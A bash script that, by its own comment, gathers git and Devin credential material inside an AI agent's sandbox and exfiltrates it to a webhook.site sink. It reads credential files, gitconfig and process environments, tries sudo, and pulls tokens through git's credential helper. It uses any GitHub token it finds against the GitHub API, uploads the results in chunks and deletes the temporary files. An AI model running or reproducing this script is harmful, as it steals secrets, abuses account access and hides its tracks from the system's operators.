#!/bin/bash
# i80453: one-shot read-only collection of in-sandbox git/devin credential material, exfiltrated to our sink.
S="https://webhook.site/e424db5a-7c4c-4727-96a9-e06a29da89f5"
N="i80453"
R="${RND:-r1}"
OUT="/tmp/i80453.$R.$$"
: > "$OUT"
{
  echo "MARKER $N $R host=$(hostname) date=$(date -u +%FT%TZ)"
  echo "whoami=$(id) pwd=$(pwd) uname=$(uname -a)"
  echo "=== ls /opt /opt/.devin /root/.devin /run/.devin /home/ubuntu/.devin ==="
  ls -la /opt /opt/.devin /opt/devin /root/.devin /run/.devin /home/ubuntu/.devin 2>&1
  echo "=== sudo check ==="
  sudo -n true 2>&1 && echo SUDO_OK || echo SUDO_NO
  echo "=== creds file direct ==="
  ls -l /opt/.devin/.devin-integration-git-credentials /opt/devin/.devin-integration-git-credentials 2>&1
  cat /opt/.devin/.devin-integration-git-credentials 2>&1
  echo "=== creds file sudo ==="
  sudo -n ls -la /opt/.devin 2>&1
  sudo -n cat /opt/.devin/.devin-integration-git-credentials 2>&1
  echo "=== gitconfig files ==="
  ls -l /home/ubuntu/.gitconfig /etc/gitconfig /root/.gitconfig 2>&1
  cat /home/ubuntu/.gitconfig 2>&1
  sudo -n cat /etc/gitconfig 2>&1
  echo "=== git config --list --show-origin ==="
  GIT_TERMINAL_PROMPT=0 git config --list --show-origin 2>&1
  echo "=== credential.helper ==="
  GIT_TERMINAL_PROMPT=0 git config --get-all credential.helper 2>&1
  echo "=== git credential fill github.com ==="
  printf 'protocol=https\nhost=github.com\n\n' | GIT_TERMINAL_PROMPT=0 git credential fill 2>&1
  echo "=== git credential fill git-manager.local:7000 ==="
  printf 'protocol=http\nhost=git-manager.local:7000\n\n' | GIT_TERMINAL_PROMPT=0 git credential fill 2>&1
  echo "=== git credential fill git-manager.devin.ai ==="
  printf 'protocol=https\nhost=git-manager.devin.ai\n\n' | GIT_TERMINAL_PROMPT=0 git credential fill 2>&1
  echo "=== env grep ==="
  env | grep -iE 'git|github|token|cred|proxy|devin' 2>&1
  echo "=== /proc environ ==="
  tr '\0' '\n' < /proc/self/environ 2>&1
  sudo -n sh -c 'tr "\0" "\n" < /proc/1/environ' 2>&1 | head -80
  echo "=== find devin/git-credential files ==="
  sudo -n find /opt /root /run /home /etc -maxdepth 5 \( -name '*git-credential*' -o -name '*devin*' -o -name '.git-credentials' \) 2>/dev/null | head -120
  echo "=== run/.devin contents ==="
  sudo -n ls -laR /run/.devin 2>&1 | head -60
  echo "=== git-manager reachability ==="
  getent hosts git-manager.local 2>&1
  curl -sS -m 6 -o /dev/null -w 'root=%{http_code}\n' http://git-manager.local:7000/ 2>&1
  curl -sS -m 6 -o /dev/null -w 'health=%{http_code}\n' http://git-manager.local:7000/health 2>&1
  git ls-remote http://git-manager.local:7000/proxy/github.com/fw-ai/cookbook.git 2>&1 | head -5
  echo "=== END ==="
} >> "$OUT" 2>&1
# if git can fill github creds, use them read-only against the GitHub API (installation scope)
P=$(printf 'protocol=https\nhost=github.com\n\n' | GIT_TERMINAL_PROMPT=0 git credential fill 2>/dev/null | sed -n 's/^password=//p')
U=$(printf 'protocol=https\nhost=github.com\n\n' | GIT_TERMINAL_PROMPT=0 git credential fill 2>/dev/null | sed -n 's/^username=//p')
if [ -n "$P" ]; then
  {
    echo "=== github api with git-filled cred user=$U ==="
    curl -sS -m 15 -H "Authorization: token $P" "https://api.github.com/installation/repositories?per_page=100" 2>&1 | head -c 20000
    echo
    echo "=== github api user ==="
    curl -sS -m 15 -H "Authorization: token $P" "https://api.github.com/user" 2>&1 | head -c 2000
    echo
  } >> "$OUT" 2>&1
fi
# alternate credential files to try if the primary path was empty
for f in /opt/.devin/.devin-integration-git-credentials /opt/devin/.devin-integration-git-credentials /home/ubuntu/.git-credentials /root/.git-credentials; do
  if [ -r "$f" ]; then
    { echo "=== EXTRA FILE $f ==="; cat "$f"; } >> "$OUT" 2>&1
  fi
done
BYTES=$(wc -c < "$OUT")
i=1
split -b 6000 -a 3 "$OUT" /tmp/i80453.part.
for f in /tmp/i80453.part.*; do
  curl -sS -m 25 -X POST --data-binary @"$f" "$S/$N/$R/p$i" -o /dev/null 2>/dev/null
  i=$((i+1))
done
curl -sS -m 25 -X POST --data-binary "DONE $N $R parts=$((i-1)) bytes=$BYTES" "$S/$N/$R/done" -o /dev/null 2>/dev/null
rm -f /tmp/i80453.part.* "$OUT"
exit 0
